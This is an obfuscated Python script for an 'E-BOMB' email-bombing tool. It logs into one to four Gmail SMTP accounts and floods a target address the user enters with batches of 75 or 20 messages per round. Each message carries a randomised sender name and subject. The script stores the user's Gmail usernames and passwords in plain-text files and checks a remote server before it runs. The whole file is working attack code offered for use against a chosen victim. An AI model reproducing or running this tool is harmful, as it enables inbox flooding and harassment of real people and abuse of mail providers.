import sys #line:1
import os #line:2
import random #line:3
import string #line:4
import smtplib #line:5
import time #line:6
import requests #line:7
from email .message import EmailMessage #line:8
import webbrowser #line:9
def start_bomb ():#line:12
    clear_terminal ()#line:13
    banner ()#line:14
    print ("")#line:15
    print ("")#line:16
    if os .path .isfile ("pw4.txt"):#line:17
        print ("[\033[91m1\033[0m]\033[92m SINGLE EMAIL MODE ")#line:18
        print ("")#line:19
        print ("[\033[91m2\033[0m]\033[92m MULTI EMAIL MODE ")#line:20
    else :#line:21
        print ("[\033[91m1\033[0m]\033[92m SINGLE EMAIL MODE")#line:22
    print ("")#line:24
    print ("")#line:25
    OO0OOO00OO0O0O0O0 =int (input ("\033[92mEnter your attack mode: \033[0m"))#line:26
    print ("")#line:27
    OOOO000O000OOO00O =int (input ('\033[92mEnter Amount (1 = 75): \033[0m'))#line:28
    print ("")#line:29
    O0OO00O0O00O000O0 =str (input ('\033[92mEnter the Email Name: \033[0m'))#line:30
    print ("")#line:31
    OO0O0O00OO00OOOO0 =str (input ('\033[92mEnter target email address: \033[0m'))#line:32
    print ("")#line:33
    OOO0OOO00O00O0O00 =input ('\033[92mEmail Body:\033[0m ')#line:34
    print ("")#line:35
    clear_terminal ()#line:36
    banner ()#line:37
    if OO0OOO00OO0O0O0O0 ==2 :#line:38
    	 OO0O0O0OOOO0O0O00 =OOOO000O000OOO00O *75 #line:39
    	 print ("")#line:40
    	 print (f"Amount of email sent: {OO0O0O0OOOO0O0O00}")#line:41
    	 O00OO00OOOOO0OO00 =1 #line:42
    	 for _OOO0OO0000OOO0O00 in range (OOOO000O000OOO00O ):#line:43
    	 	email_bomber1 (O0OO00O0O00O000O0 ,OO0O0O00OO00OOOO0 ,OOO0OOO00O00O0O00 )#line:45
    	 	O00OO0OO000OO000O =O00OO00OOOOO0OO00 *20 #line:46
    	 	print ("")#line:47
    	 	print (f"{O00OO0OO000OO000O} sent ")#line:48
    	 	O00OO00OOOOO0OO00 =O00OO00OOOOO0OO00 +1 #line:49
    	 	email_bomber2 (O0OO00O0O00O000O0 ,OO0O0O00OO00OOOO0 ,OOO0OOO00O00O0O00 )#line:51
    	 	OOO0O00000000OOO0 =O00OO00OOOOO0OO00 *20 #line:52
    	 	print ("")#line:53
    	 	print (f"{OOO0O00000000OOO0} sent ")#line:54
    	 	O00OO00OOOOO0OO00 =O00OO00OOOOO0OO00 +1 #line:55
    	 	email_bomber3 (O0OO00O0O00O000O0 ,OO0O0O00OO00OOOO0 ,OOO0OOO00O00O0O00 )#line:57
    	 	OOOOOO0OOO0O00OO0 =O00OO00OOOOO0OO00 *20 #line:58
    	 	print ("")#line:59
    	 	print (f"{OOOOOO0OOO0O00OO0} sent ")#line:60
    	 	O00OO00OOOOO0OO00 =O00OO00OOOOO0OO00 +1 #line:61
    	 	email_bomber4 (O0OO00O0O00O000O0 ,OO0O0O00OO00OOOO0 ,OOO0OOO00O00O0O00 )#line:63
    	 	OOO0O0OOOO00OO000 =O00OO00OOOOO0OO00 *20 #line:64
    	 	print ("")#line:65
    	 	print (f"{OOO0O0OOOO00OO000} sent ")#line:66
    	 	O00OO00OOOOO0OO00 =O00OO00OOOOO0OO00 +1 #line:67
    if OO0OOO00OO0O0O0O0 ==1 :#line:73
        OO0O0O0OOOO0O0O00 =OOOO000O000OOO00O *75 #line:74
        print ("")#line:75
        print (f"Amount of email sent: {OO0O0O0OOOO0O0O00}")#line:76
        for _OOO0OO0000OOO0O00 in range (OOOO000O000OOO00O ):#line:77
            O00OO00OOOOO0OO00 =(_OOO0OO0000OOO0O00 +1 )*75 #line:78
            email_bomber (O0OO00O0O00O000O0 ,OO0O0O00OO00OOOO0 ,OOO0OOO00O00O0O00 )#line:79
            print (f"{O00OO00OOOOO0OO00} email pack successfully sent!")#line:80
            print ("")#line:81
            print ("wait a moment. this is for your email safety")#line:82
            time .sleep (150 )#line:83
            print ("")#line:84
def run_tool ():#line:90
    clear_terminal ()#line:91
    print ("\033[96mChecking the status of the tool\033[0m")#line:92
    print ("")#line:93
    time .sleep (1 )#line:94
    print ("\033[94mCheck availability of tool\033[0m")#line:95
    O00OO000000O0OO00 =requests .get ('https://bombtoolactive.onrender.com/status')#line:97
    if O00OO000000O0OO00 .status_code ==200 :#line:98
        OOO00000OOOO000O0 =O00OO000000O0OO00 .json ()#line:99
        if OOO00000OOOO000O0 .get ('version')!='one':#line:100
            print ("Current version is not 1. Please update the tool...")#line:101
            time .sleep (8 )#line:102
            update_tool ()#line:103
            return #line:104
        if OOO00000OOOO000O0 .get ('tool')=='enabled':#line:105
            print ("")#line:106
            print ('Tool is available ✅️ . Running the tool...')#line:107
            time .sleep (1 )#line:108
            check_file_exists ()#line:109
        else :#line:110
            print ('Tool is not enabled. Exiting...Update tool')#line:111
            time .sleep (8 )#line:112
            sys .exit ()#line:113
    else :#line:114
        print ('Error occurred while requesting status endpoint:',O00OO000000O0OO00 .status_code )#line:115
def update_tool ():#line:117
	open_whatsapp_group_link ('https://github.com/SENTIN0/E-BOMB')#line:118
def banner ():#line:126
    OOOOO0000O00OO000 =f"""
███████╗              ██████╗  ██████╗ ███╗   ███╗██████╗ 
██╔════╝              ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
█████╗      █████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝
██╔══╝      ╚════╝    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
███████╗              ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
╚══════╝              ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
    """#line:134
    O0O00O00000OO00OO ="\033[91m"#line:135
    O0000OO0O0000O0O0 ="\033[94m"#line:136
    OOOO000OOOOOOOO00 ="\033[92m"#line:137
    OOOO00000000000OO ="\033[0m"#line:138
    OOO0O0OOOO0000OO0 =os .get_terminal_size ()#line:141
    O00O00OOO0OO0O0O0 =" "*((OOO0O0OOOO0000OO0 .columns )//16 )#line:144
    print (O0O00O00000OO00OO +O00O00OOO0OO0O0O0 +OOOOO0000O00OO000 +OOOO00000000000OO )#line:147
def open_whatsapp_group_link (O0OO000OOO0O0OO00 ):#line:149
    if sys .platform .startswith ('win'):#line:150
        webbrowser .open (O0OO000OOO0O0OO00 )#line:151
    elif sys .platform .startswith ('linux'):#line:152
        os .system (f"termux-open-url {O0OO000OOO0O0OO00}")#line:153
    else :#line:154
        print ("Unsupported platform. Unable to open the link.")#line:155
def ifelsefunc (OOOO00OO0000O000O ):#line:160
    if OOOO00OO0000O000O ==5 :#line:161
    	sys .exit ()#line:162
    if OOOO00OO0000O000O ==1 :#line:163
        clear_terminal ()#line:164
        start_bomb ()#line:165
    elif OOOO00OO0000O000O ==2 :#line:166
        clear_terminal ()#line:167
        save_input_to_file ()#line:168
    elif OOOO00OO0000O000O ==3 :#line:169
    	open_whatsapp_group_link ("https://youtu.be/MHxoD4x3fgo")#line:170
    elif OOOO00OO0000O000O ==4 :#line:172
    	open_whatsapp_group_link ("https://chat.whatsapp.com/KFpd32E8Mv64Nw8ZBDOXFe")#line:173
    else :#line:175
        print ("Invalid day number")#line:176
        time .sleep (4 )#line:177
        clear_terminal ()#line:178
        display_banner ()#line:179
def display_banner ():#line:184
    import os #line:185
    OO0OOO0OO0000OOOO ="Tool By Sentino"#line:187
    O0OOO0OOO0OO0O00O ="JF TEAM"#line:188
    OO0OOO0OOO00O000O =f"""
███████╗              ██████╗  ██████╗ ███╗   ███╗██████╗ 
██╔════╝              ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
█████╗      █████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝
██╔══╝      ╚════╝    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
███████╗              ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
╚══════╝              ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
    """#line:196
    O0OOO0OOO0O00OO0O ='\033[30m'#line:199
    OO00OOOO00O00O00O ='\033[31m'#line:200
    O00OO0OO00OOOOO0O ='\033[32m'#line:201
    OO0O00OOOOO000O0O ='\033[33m'#line:202
    O00OOO00OOO00OOOO ='\033[34m'#line:203
    OOO000OOO0OO00O0O ='\033[35m'#line:204
    OOO00OOO0O00O0O00 ='\033[36m'#line:205
    OOO0O0O0O00O00O00 ='\033[37m'#line:206
    OOOOOO0O0O0O00OO0 ='\033[40m'#line:209
    OO000O00O0O0OO0OO ='\033[41m'#line:210
    OO0000O00OOOO00OO ='\033[42m'#line:211
    O0OOOOO0OOOO000O0 ='\033[43m'#line:212
    OOOO00O00OOO0O0OO ='\033[44m'#line:213
    OO00OO0000OOOOO0O ='\033[45m'#line:214
    OO00OOOOOO0000O0O ='\033[46m'#line:215
    O000OO0OOO00O0OO0 ='\033[47m'#line:216
    OOO0O00O0000OOO0O ='\033[1m'#line:219
    O0O0000O0O0OOO0O0 ='\033[4m'#line:220
    OO0OO00O00OOOOOO0 ='\033[0m'#line:221
    OO00O0OO0O00O0OO0 =os .get_terminal_size ()#line:224
    O0OO00000O0O0O0OO =" "*((OO00O0OO0O00O0OO0 .columns )//16 )#line:227
    print (OO00OOOO00O00O00O +O0OO00000O0O0O0OO +OO0OOO0OOO00O000O +OO0OO00O00OOOOOO0 )#line:230
    OOOOOO00O00O00OOO =" "*((OO00O0OO0O00O0OO0 .columns -len (OO0OOO0OO0000OOOO ))//2 )#line:233
    O0O00000000O00000 =" "*((OO00O0OO0O00O0OO0 .columns -len (O0OOO0OOO0OO0O00O ))//2 )#line:235
    print (OOOOOO00O00O00OOO +OOO0O00O0000OOO0O +O0O0000O0O0OOO0O0 +OO0OOO0OO0000OOOO +OO0OO00O00OOOOOO0 )#line:238
    print (O0O00000000O00000 +OOO0O00O0000OOO0O +O000OO0OOO00O0OO0 +OO00OOOO00O00O00O +"J"+O0OOO0OOO0O00OO0O +"F"+OO0OO00O00OOOOOO0 +" "+OO00OOOOOO0000O0O +O0OOO0OOO0O00OO0O +"TEAM"+OO0OO00O00OOOOOO0 )#line:239
    print ("")#line:240
    O0O0O0000OO0O0O00 ="_"*OO00O0OO0O00O0OO0 .columns #line:241
    print (OOO00OOO0O00O0O00 +O0O0O0000OO0O0O00 +OO0OO00O00OOOOOO0 )#line:242
    print ("\n"*2 )#line:244
    O0O0OOOOOOOO0OOO0 =["[1] Start Attack               [2] Change UN,PW","[3] How to Use                 [4] Support team"]#line:249
    OOO0O0O0OO0OOOO00 =max (len (O00O0OOO0OOO00OOO )for O00O0OOO0OOO00OOO in O0O0OOOOOOOO0OOO0 )#line:251
    for OO0O0OO0O0OOO0000 in O0O0OOOOOOOO0OOO0 :#line:253
        O00O00O0O0O0OO0O0 =" "*((OO00O0OO0O00O0OO0 .columns -len (OO0O0OO0O0OOO0000 ))//2 )#line:254
        OO0OOOOO000OOOOO0 =" "*((OO00O0OO0O00O0OO0 .columns -len ("[5] EXIT"))//2 )#line:255
        print (O00OO0OO00OOOOO0O +O00O00O0O0O0OO0O0 +OO0O0OO0O0OOO0000 +OO0OO00O00OOOOOO0 )#line:256
        print ("")#line:257
    print (OO0OOOOO000OOOOO0 +OO00OOOO00O00O00O +"[5] EXIT"+OO0OO00O00OOOOOO0 )#line:260
    print ("\n"*2 )#line:261
    OO0OO0O00OO000O0O =int (input (O00OO0OO00OOOOO0O +"Enter your choice: "+OO0OO00O00OOOOOO0 ))#line:262
    ifelsefunc (OO0OO0O00OO000O0O )#line:263
def clear_terminal ():#line:268
    if sys .platform .startswith ('win'):#line:269
        os .system ('cls')#line:270
    else :#line:271
        os .system ('clear')#line:272
def check_file_exists ():#line:274
    clear_terminal ()#line:275
    banner ()#line:276
    print ("check files")#line:277
    time .sleep (1 )#line:278
    print ("")#line:279
    if os .path .isfile ("pw1.txt"):#line:280
        print ("File exists.")#line:281
        time .sleep (1 )#line:282
        clear_terminal ()#line:283
        display_banner ()#line:284
    else :#line:285
        print ("File does not exist.")#line:286
        time .sleep (1 )#line:287
        clear_terminal ()#line:288
        save_input_to_file ()#line:289
def save_input_to_file ():#line:291
    clear_terminal ()#line:292
    print ("")#line:294
    print ("")#line:295
    print ("")#line:296
    print ("")#line:297
    print ("[\033[91m1\033[0m] MULTI EMAIL MODE  \n\n There is no waiting time when you use the multi email mode and you need 4 emails to use this.  (If you give the same email to all 4 emails, the tool may not work properly.)")#line:298
    print ("")#line:299
    print ("")#line:300
    print ("")#line:301
    print ("")#line:302
    print ("[\033[91m2\033[0m] SINGLE EMAIL MODE \n\n When you use the single email mode, there is a waiting time of 2 or 3 minutes, and one email is enough for you to use this. ")#line:303
    print ("")#line:304
    print ("")#line:305
    O0O0OOOO0OO000OO0 =int (input ("Enter your mode selection "))#line:306
    if O0O0OOOO0OO000OO0 ==1 :#line:308
    	clear_terminal ()#line:309
    	banner ()#line:310
    	print ("")#line:311
    	print ("Those who do not know how to get a username and password Type 'skip'")#line:312
    	print ("")#line:313
    	print ("Email - 01")#line:315
    	OOOO0O0O00O0OO0O0 =input ("Enter your username : ")#line:316
    	if OOOO0O0O00O0OO0O0 =="skip":#line:317
    		open_whatsapp_group_link ("https://youtu.be/MHxoD4x3fgo")#line:318
    		sys .exit ()#line:319
    	print ("")#line:322
    	O0O0O000O00000OO0 =input ("Enter your passward : ")#line:323
    	with open ("pw1.txt","w")as OO0O000O00O000OO0 :#line:324
    		OO0O000O00O000OO0 .write (O0O0O000O00000OO0 )#line:325
    	with open ("un1.txt","w")as OO0O000O00O000OO0 :#line:327
    		OO0O000O00O000OO0 .write (OOOO0O0O00O0OO0O0 )#line:328
    	print ("")#line:329
    	print ("Email - 02")#line:330
    	O0OO0OO0OO00000O0 =input ("Enter your username : ")#line:331
    	print ("")#line:332
    	O0O0O0O00O0O00OO0 =input ("Enter your passward : ")#line:333
    	with open ("pw2.txt","w")as OO0O000O00O000OO0 :#line:335
    		OO0O000O00O000OO0 .write (O0O0O0O00O0O00OO0 )#line:336
    	with open ("un2.txt","w")as OO0O000O00O000OO0 :#line:338
    		OO0O000O00O000OO0 .write (O0OO0OO0OO00000O0 )#line:339
    	print ("")#line:340
    	print ("Email - 03")#line:341
    	OOO000OO000OO00OO =input ("Enter your username : ")#line:342
    	print ("")#line:343
    	O0OOO00000OOO00O0 =input ("Enter your passward : ")#line:344
    	with open ("pw3.txt","w")as OO0O000O00O000OO0 :#line:346
    		OO0O000O00O000OO0 .write (O0OOO00000OOO00O0 )#line:347
    	with open ("un3.txt","w")as OO0O000O00O000OO0 :#line:349
    		OO0O000O00O000OO0 .write (OOO000OO000OO00OO )#line:350
    	print ("")#line:351
    	print ("Email - 04")#line:352
    	OOO000OOO0O000000 =input ("Enter your username : ")#line:353
    	print ("")#line:354
    	O0O0000OOO00O0O0O =input ("Enter your passward : ")#line:355
    	with open ("pw4.txt","w")as OO0O000O00O000OO0 :#line:357
    		OO0O000O00O000OO0 .write (O0O0000OOO00O0O0O )#line:358
    	with open ("un4.txt","w")as OO0O000O00O000OO0 :#line:360
    		OO0O000O00O000OO0 .write (OOO000OOO0O000000 )#line:361
    if O0O0OOOO0OO000OO0 ==2 :#line:367
    	clear_terminal ()#line:368
    	banner ()#line:369
    	print ("")#line:370
    	print ("Those who do not know how to get a username and password Type 'skip'")#line:371
    	print ("")#line:372
    	OOOO0O0O00O0OO0O0 =input ("Enter your username : ")#line:373
    	if OOOO0O0O00O0OO0O0 =="skip":#line:374
    		open_whatsapp_group_link ("https://youtu.be/MHxoD4x3fgo")#line:375
    		sys .exit ()#line:376
    	O0O0O000O00000OO0 =input ("Enter your passward : ")#line:377
    	with open ("pw1.txt","w")as OO0O000O00O000OO0 :#line:378
    		OO0O000O00O000OO0 .write (O0O0O000O00000OO0 )#line:379
    	with open ("un1.txt","w")as OO0O000O00O000OO0 :#line:381
    		OO0O000O00O000OO0 .write (OOOO0O0O00O0OO0O0 )#line:382
    print ("Input saved")#line:385
    clear_terminal ()#line:386
    display_banner ()#line:387
def generate_random_letters ():#line:393
    O00OOOO00000O0O00 =string .ascii_lowercase +string .digits #line:394
    O0O0OOOOO00O00000 =''.join (random .choice (O00OOOO00000O0O00 )for _O0000O000O0O0O000 in range (4 ))#line:395
    return O0O0OOOOO00O00000 #line:396
def read_password1 ():#line:400
    with open ("pw1.txt","r")as O00OO0000OO0OOOOO :#line:401
        O000OO0O000O0OOOO =O00OO0000OO0OOOOO .read ()#line:402
        return O000OO0O000O0OOOO #line:403
def read_username1 ():#line:405
    with open ("un1.txt","r")as O00000O0O0OOO0O0O :#line:406
        OOOOO0O0O0OOOOOO0 =O00000O0O0OOO0O0O .read ()#line:407
        return OOOOO0O0O0OOOOOO0 #line:408
def read_password2 ():#line:411
    with open ("pw2.txt","r")as O000OOO0000O0OOOO :#line:412
        OO00O00O0OOO0O000 =O000OOO0000O0OOOO .read ()#line:413
        return OO00O00O0OOO0O000 #line:414
def read_username2 ():#line:416
    with open ("un2.txt","r")as OOO0O0O0O0OOO00OO :#line:417
        O00O000OOOOOO00OO =OOO0O0O0O0OOO00OO .read ()#line:418
        return O00O000OOOOOO00OO #line:419
def read_password3 ():#line:422
    with open ("pw3.txt","r")as O0OO0O00O0OOO000O :#line:423
        OOOOOOOO00O0OO00O =O0OO0O00O0OOO000O .read ()#line:424
        return OOOOOOOO00O0OO00O #line:425
def read_username3 ():#line:427
    with open ("un3.txt","r")as O0O00O00OOOOO00O0 :#line:428
        OOO00OOOOO0O0OO00 =O0O00O00OOOOO00O0 .read ()#line:429
        return OOO00OOOOO0O0OO00 #line:430
def read_password4 ():#line:434
    with open ("pw4.txt","r")as O00OOO0000OOOO00O :#line:435
        O0OO00OO00OO000OO =O00OOO0000OOOO00O .read ()#line:436
        return O0OO00OO00OO000OO #line:437
def read_username4 ():#line:439
    with open ("un4.txt","r")as O0OOOOOOO0OOOO000 :#line:440
        O0OOO00OOOO00O0OO =O0OOOOOOO0OOOO000 .read ()#line:441
        return O0OOO00OOOO00O0OO #line:442
def email_bomber (OO000O0OO0O000O00 ,O0O00OO0OOOO0O000 ,OOOOOO0OO00000000 ):#line:446
    O00OO000O0OOOO000 ='smtp.gmail.com'#line:449
    O0OO000OO0O0OO0OO =587 #line:450
    OOOOOO00O000O00OO =read_username1 ()#line:451
    OOO0O0OOO0OO0O000 =read_password1 ()#line:452
    OO000O0OO0O000O00 =OO000O0OO0O000O00 #line:454
    O0OO0OOOOO00O0O0O =OOOOOO00O000O00OO #line:456
    O0O00OO0OOOO0O000 =O0O00OO0OOOO0O000 #line:457
    OO00O000OOOOOOO00 ="E - BOMB - "#line:459
    OOOOOO0OO00000000 =OOOOOO0OO00000000 #line:460
    try :#line:463
        with smtplib .SMTP (O00OO000O0OOOO000 ,O0OO000OO0O0OO0OO )as O00OO000O0OOOO000 :#line:464
            O00OO000O0OOOO000 .starttls ()#line:465
            O00OO000O0OOOO000 .login (OOOOOO00O000O00OO ,OOO0O0OOO0OO0O000 )#line:466
            for _O00OOO0OOOOOOOO0O in range (75 ):#line:467
                OOO0OO0O0OOOOOOO0 =generate_random_letters ()#line:468
                O00O00O0000O00000 =generate_random_letters ()#line:469
                OOOOO0O00OO000OOO =f"{OO000O0OO0O000O00} - {O00O00O0000O00000}"#line:470
                O0O0000O0O00O0O00 =f"{OOO0OO0O0OOOOOOO0}{O00O00O0000O00000}@gmail.com"#line:471
                OOO0O000OO0OOO0O0 =EmailMessage ()#line:473
                OOO0O000OO0OOO0O0 ['From']=f'{OOOOO0O00OO000OOO} <{O0O00OO0OOOO0O000}>'#line:474
                OOO0O000OO0OOO0O0 ['To']=O0O00OO0OOOO0O000 #line:475
                OOO0O000OO0OOO0O0 ['Subject']=f"{OO00O000OOOOOOO00} {OOO0OO0O0OOOOOOO0}"#line:476
                OOO0O000OO0OOO0O0 .set_content (OOOOOO0OO00000000 )#line:477
                O00OO000O0OOOO000 .send_message (OOO0O000OO0OOO0O0 )#line:478
                print (f"Sent email {_O00OOO0OOOOOOOO0O}")#line:479
    except Exception as OO0O0O0000O0000O0 :#line:482
        print ('Error:',str (OO0O0O0000O0000O0 ))#line:483
def email_bomber1 (O000OO00OO0O00O00 ,OO00OO00O0OOO0O00 ,O0O0O0OOOOOOO000O ):#line:485
    OOO000OO0O0000OOO ='smtp.gmail.com'#line:488
    O0OOO0O0OO0O0000O =587 #line:489
    O0O00O0O00OO0OO0O =read_username1 ()#line:490
    O00O00O0O0O000000 =read_password1 ()#line:491
    O000OO00OO0O00O00 =O000OO00OO0O00O00 #line:493
    OO000OOO0000000OO =O0O00O0O00OO0OO0O #line:495
    OO00OO00O0OOO0O00 =OO00OO00O0OOO0O00 #line:496
    OO00OOOOO0O0000O0 ="E - BOMB - "#line:498
    O0O0O0OOOOOOO000O =O0O0O0OOOOOOO000O #line:499
    try :#line:502
        with smtplib .SMTP (OOO000OO0O0000OOO ,O0OOO0O0OO0O0000O )as OOO000OO0O0000OOO :#line:503
            OOO000OO0O0000OOO .starttls ()#line:504
            OOO000OO0O0000OOO .login (O0O00O0O00OO0OO0O ,O00O00O0O0O000000 )#line:505
            for _O0OO00O00OO0OO0OO in range (20 ):#line:506
                OOO0OOO0O000OO00O =generate_random_letters ()#line:507
                O0000O000O0O00OOO =generate_random_letters ()#line:508
                O0O000000000OOOOO =f"{O000OO00OO0O00O00} - {O0000O000O0O00OOO}"#line:509
                OOOOOO0O0O0O00O0O =f"{OOO0OOO0O000OO00O}{O0000O000O0O00OOO}@gmail.com"#line:510
                OOO0O00OO00O0O0O0 =EmailMessage ()#line:512
                OOO0O00OO00O0O0O0 ['From']=f'{O0O000000000OOOOO} <{OO00OO00O0OOO0O00}>'#line:513
                OOO0O00OO00O0O0O0 ['To']=OO00OO00O0OOO0O00 #line:514
                OOO0O00OO00O0O0O0 ['Subject']=f"{OO00OOOOO0O0000O0} {OOO0OOO0O000OO00O}"#line:515
                OOO0O00OO00O0O0O0 .set_content (O0O0O0OOOOOOO000O )#line:516
                OOO000OO0O0000OOO .send_message (OOO0O00OO00O0O0O0 )#line:517
                print (f"Sent email {_O0OO00O00OO0OO0OO}")#line:518
    except Exception as OO0OO0OO0OO0OO0O0 :#line:521
        print ('Error:',str (OO0OO0OO0OO0OO0O0 ))#line:522
def email_bomber2 (OO0OOOOOO0O0O00O0 ,OOOOOOO0O0000OOOO ,O00O00000O0O0OO0O ):#line:525
    O0O00O00000OOOOOO ='smtp.gmail.com'#line:528
    O000O00O0O0OOOOOO =587 #line:529
    OO0O0O00OO0O0000O =read_username2 ()#line:530
    OO000OO0O00OOO0OO =read_password2 ()#line:531
    OO0OOOOOO0O0O00O0 =OO0OOOOOO0O0O00O0 #line:533
    O0OO00OO000000OOO =OO0O0O00OO0O0000O #line:535
    OOOOOOO0O0000OOOO =OOOOOOO0O0000OOOO #line:536
    OOOOO000OOOO0O0OO ="E - BOMB - "#line:538
    O00O00000O0O0OO0O =O00O00000O0O0OO0O #line:539
    try :#line:542
        with smtplib .SMTP (O0O00O00000OOOOOO ,O000O00O0O0OOOOOO )as O0O00O00000OOOOOO :#line:543
            O0O00O00000OOOOOO .starttls ()#line:544
            O0O00O00000OOOOOO .login (OO0O0O00OO0O0000O ,OO000OO0O00OOO0OO )#line:545
            for _O000OO00O0OO000O0 in range (20 ):#line:546
                OOO0OO000O00OO000 =generate_random_letters ()#line:547
                OO00O0O00OOO0O0OO =generate_random_letters ()#line:548
                OOO000OO0O00OOO00 =f"{OO0OOOOOO0O0O00O0} - {OO00O0O00OOO0O0OO}"#line:549
                O00O0O0OO0O000000 =f"{OOO0OO000O00OO000}{OO00O0O00OOO0O0OO}@gmail.com"#line:550
                OO0OO0O0OO0O00O0O =EmailMessage ()#line:552
                OO0OO0O0OO0O00O0O ['From']=f'{OOO000OO0O00OOO00} <{OOOOOOO0O0000OOOO}>'#line:553
                OO0OO0O0OO0O00O0O ['To']=OOOOOOO0O0000OOOO #line:554
                OO0OO0O0OO0O00O0O ['Subject']=f"{OOOOO000OOOO0O0OO} {OOO0OO000O00OO000}"#line:555
                OO0OO0O0OO0O00O0O .set_content (O00O00000O0O0OO0O )#line:556
                O0O00O00000OOOOOO .send_message (OO0OO0O0OO0O00O0O )#line:557
                print (f"Sent email {_O000OO00O0OO000O0}")#line:558
    except Exception as OOOOOO00OOO0O0O00 :#line:561
        print ('Error:',str (OOOOOO00OOO0O0O00 ))#line:562
def email_bomber3 (OO0O00O0000OO00OO ,OO00O0OOOO0O0O000 ,O00OOO0OO000OOOOO ):#line:564
    OO0O0O0000O0O0000 ='smtp.gmail.com'#line:567
    OO00O00OO0OOOO000 =587 #line:568
    O000OO00OOOO0O0OO =read_username3 ()#line:569
    O0OOOOO00OOOO0000 =read_password3 ()#line:570
    OO0O00O0000OO00OO =OO0O00O0000OO00OO #line:572
    O00000OOO0O00OO0O =O000OO00OOOO0O0OO #line:574
    OO00O0OOOO0O0O000 =OO00O0OOOO0O0O000 #line:575
    O0O000OOO000O0O00 ="E - BOMB - "#line:577
    O00OOO0OO000OOOOO =O00OOO0OO000OOOOO #line:578
    try :#line:581
        with smtplib .SMTP (OO0O0O0000O0O0000 ,OO00O00OO0OOOO000 )as OO0O0O0000O0O0000 :#line:582
            OO0O0O0000O0O0000 .starttls ()#line:583
            OO0O0O0000O0O0000 .login (O000OO00OOOO0O0OO ,O0OOOOO00OOOO0000 )#line:584
            for _O0000OOOOO0OO0O0O in range (20 ):#line:585
                O00000O0OOO0O0OO0 =generate_random_letters ()#line:586
                OO00000OOOO000OO0 =generate_random_letters ()#line:587
                OO00O0O000O0O0OO0 =f"{OO0O00O0000OO00OO} - {OO00000OOOO000OO0}"#line:588
                OOOO0OO0O0O000O00 =f"{O00000O0OOO0O0OO0}{OO00000OOOO000OO0}@gmail.com"#line:589
                OOOOOOOOOO0O00O00 =EmailMessage ()#line:591
                OOOOOOOOOO0O00O00 ['From']=f'{OO00O0O000O0O0OO0} <{OO00O0OOOO0O0O000}>'#line:592
                OOOOOOOOOO0O00O00 ['To']=OO00O0OOOO0O0O000 #line:593
                OOOOOOOOOO0O00O00 ['Subject']=f"{O0O000OOO000O0O00} {O00000O0OOO0O0OO0}"#line:594
                OOOOOOOOOO0O00O00 .set_content (O00OOO0OO000OOOOO )#line:595
                OO0O0O0000O0O0000 .send_message (OOOOOOOOOO0O00O00 )#line:596
                print (f"Sent email {_O0000OOOOO0OO0O0O}")#line:597
    except Exception as O000000000OOOO0O0 :#line:600
        print ('Error:',str (O000000000OOOO0O0 ))#line:601
def email_bomber4 (O00OOO00OOO0OO00O ,OOOOOOOO0O0OOOOO0 ,O0OO0000OO00OOO0O ):#line:604
    OOOOOO0O0O0OOOO0O ='smtp.gmail.com'#line:607
    O0OO0O000O0O0OO00 =587 #line:608
    O00OO0O0OOOO0O0OO =read_username4 ()#line:609
    OOOOO00O0OOO0O0O0 =read_password4 ()#line:610
    O00OOO00OOO0OO00O =O00OOO00OOO0OO00O #line:612
    OOOOOOO000O00O00O =O00OO0O0OOOO0O0OO #line:614
    OOOOOOOO0O0OOOOO0 =OOOOOOOO0O0OOOOO0 #line:615
    OO0OO00O00O0O0000 ="E - BOMB - "#line:617
    O0OO0000OO00OOO0O =O0OO0000OO00OOO0O #line:618
    try :#line:621
        with smtplib .SMTP (OOOOOO0O0O0OOOO0O ,O0OO0O000O0O0OO00 )as OOOOOO0O0O0OOOO0O :#line:622
            OOOOOO0O0O0OOOO0O .starttls ()#line:623
            OOOOOO0O0O0OOOO0O .login (O00OO0O0OOOO0O0OO ,OOOOO00O0OOO0O0O0 )#line:624
            for _O00O00O00OOO00OO0 in range (20 ):#line:625
                O00OOO0OOO00O0000 =generate_random_letters ()#line:626
                O0O0O00OOO0O0O0OO =generate_random_letters ()#line:627
                O0OO00OO000O0O0O0 =f"{O00OOO00OOO0OO00O} - {O0O0O00OOO0O0O0OO}"#line:628
                O00000O0O00000O00 =f"{O00OOO0OOO00O0000}{O0O0O00OOO0O0O0OO}@gmail.com"#line:629
                OO000O00O0OO0OO0O =EmailMessage ()#line:631
                OO000O00O0OO0OO0O ['From']=f'{O0OO00OO000O0O0O0} <{OOOOOOOO0O0OOOOO0}>'#line:632
                OO000O00O0OO0OO0O ['To']=OOOOOOOO0O0OOOOO0 #line:633
                OO000O00O0OO0OO0O ['Subject']=f"{OO0OO00O00O0O0000} {O00OOO0OOO00O0000}"#line:634
                OO000O00O0OO0OO0O .set_content (O0OO0000OO00OOO0O )#line:635
                OOOOOO0O0O0OOOO0O .send_message (OO000O00O0OO0OO0O )#line:636
                print (f"Sent email {_O00O00O00OOO00OO0}")#line:637
    except Exception as OO0OOO0OOO0OOO0OO :#line:640
        print ('Error:',str (OO0OOO0OOO0OOO0OO ))#line:641
run_tool ()